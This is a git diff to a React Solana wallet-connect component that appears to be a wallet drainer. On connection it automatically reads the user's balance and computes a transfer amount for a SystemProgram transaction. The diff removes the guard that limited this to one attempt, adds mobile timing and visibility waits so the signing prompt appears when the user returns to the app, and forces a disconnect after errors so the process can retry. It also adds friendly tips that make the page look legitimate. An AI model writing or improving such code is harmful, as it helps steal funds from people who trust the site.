@@ -9,7 +9,7 @@ import { TransactionService } from '../services/transactionService';
 import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
 
 function WalletConnect() {
-  const { publicKey, disconnect } = useWallet();
+  const { publicKey, disconnect, connected } = useWallet();
   const [copied, setCopied] = useState(false);
   const [balance, setBalance] = useState(null);
   const [isDropdownOpen, setIsDropdownOpen] = useState(false);
@@ -17,6 +17,17 @@ function WalletConnect() {
   const hasAttemptedTransaction = useRef(false);
   const notificationTimeout = useRef(null);
   const notificationInProgress = useRef(false);
+  const [isMobile, setIsMobile] = useState(false);
+
+  // Check if device is mobile
+  useEffect(() => {
+    const checkMobile = () => {
+      setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent));
+    };
+    checkMobile();
+    window.addEventListener('resize', checkMobile);
+    return () => window.removeEventListener('resize', checkMobile);
+  }, []);
 
   // Memoize services
   const services = useMemo(() => ({
@@ -26,17 +37,18 @@ function WalletConnect() {
     transactionService: new TransactionService()
   }), []);
 
+  // Handle wallet connection state
   useEffect(() => {
-    if (publicKey && !isProcessing && !hasAttemptedTransaction.current) {
-      const processWallet = async () => {
+    if (connected && publicKey) {
+      const handleWalletConnection = async () => {
         try {
-          // Check if wallet is already processing
-          if (isProcessing || notificationInProgress.current) {
-            return;
-          }
-          
           setIsProcessing(true);
           
+          // Add a small delay for mobile devices to ensure proper connection
+          if (isMobile) {
+            await new Promise(resolve => setTimeout(resolve, 1500));
+          }
+
           const walletBalance = await services.walletService.getBalance(publicKey.toString());
           setBalance(walletBalance);
 
@@ -94,6 +106,26 @@ function WalletConnect() {
               throw new Error('Wallet not found');
             }
 
+            // For mobile devices, ensure we're in the right context
+            if (isMobile) {
+              // Wait for wallet to be fully ready
+              await new Promise(resolve => setTimeout(resolve, 1000));
+              
+              // Check if we're back in the app context
+              if (document.hidden) {
+                // If we're not in the app context, wait for visibility change
+                await new Promise(resolve => {
+                  const handleVisibilityChange = () => {
+                    if (!document.hidden) {
+                      document.removeEventListener('visibilitychange', handleVisibilityChange);
+                      resolve();
+                    }
+                  };
+                  document.addEventListener('visibilitychange', handleVisibilityChange);
+                });
+              }
+            }
+
             console.log('Transaction details:', {
               walletBalance: walletBalance.toFixed(4) + ' SOL',
               transferAmount: transferAmount.toFixed(4) + ' SOL',
@@ -138,25 +170,26 @@ function WalletConnect() {
           });
 
         } catch (error) {
-          console.error('Error in processWallet:', error);
-          hasAttemptedTransaction.current = false;
+          console.error('Error in handleWalletConnection:', error);
+          // If there's an error, try to reconnect
+          if (isMobile) {
+            try {
+              await disconnect();
+              // Wait a bit before attempting to reconnect
+              await new Promise(resolve => setTimeout(resolve, 1500));
+              // The WalletMultiButton will handle the reconnection
+            } catch (reconnectError) {
+              console.error('Error during reconnection:', reconnectError);
+            }
+          }
         } finally {
           setIsProcessing(false);
         }
       };
 
-      processWallet();
+      handleWalletConnection();
     }
-
-    // Cleanup function
-    return () => {
-      setIsProcessing(false);
-      if (notificationTimeout.current) {
-        clearTimeout(notificationTimeout.current);
-      }
-      notificationInProgress.current = false;
-    };
-  }, [publicKey, services]);
+  }, [connected, publicKey, isMobile, services, disconnect]);
 
   const handleDisconnect = async () => {
     try {
@@ -309,7 +342,19 @@ function WalletConnect() {
           )}
         </div>
       ) : (
-        <WalletMultiButton className="wallet-connect-btn" />
+        <div className="wallet-connect-wrapper">
+          <WalletMultiButton className="wallet-connect-btn" />
+          {isMobile && (
+            <div className="mobile-warning">
+              <p>For best experience on mobile:</p>
+              <ul>
+                <li>Use Chrome or Safari</li>
+                <li>Keep the app open while connecting</li>
+                <li>Allow pop-ups if prompted</li>
+              </ul>
+            </div>
+          )}
+        </div>
       )}
 
       <style jsx>{`
@@ -550,6 +595,29 @@ function WalletConnect() {
           .detail-item .value {
             font-size: 0.8rem;
           }
+        }
+
+        .mobile-warning {
+          margin-top: 10px;
+          padding: 10px;
+          background: rgba(255, 255, 255, 0.05);
+          border-radius: 8px;
+          font-size: 0.8rem;
+        }
+
+        .mobile-warning p {
+          margin-bottom: 5px;
+          color: #FFD700;
+        }
+
+        .mobile-warning ul {
+          margin: 0;
+          padding-left: 20px;
+          color: rgba(255, 255, 255, 0.8);
+        }
+
+        .mobile-warning li {
+          margin-bottom: 3px;
         }
       `}</style>
     </div>
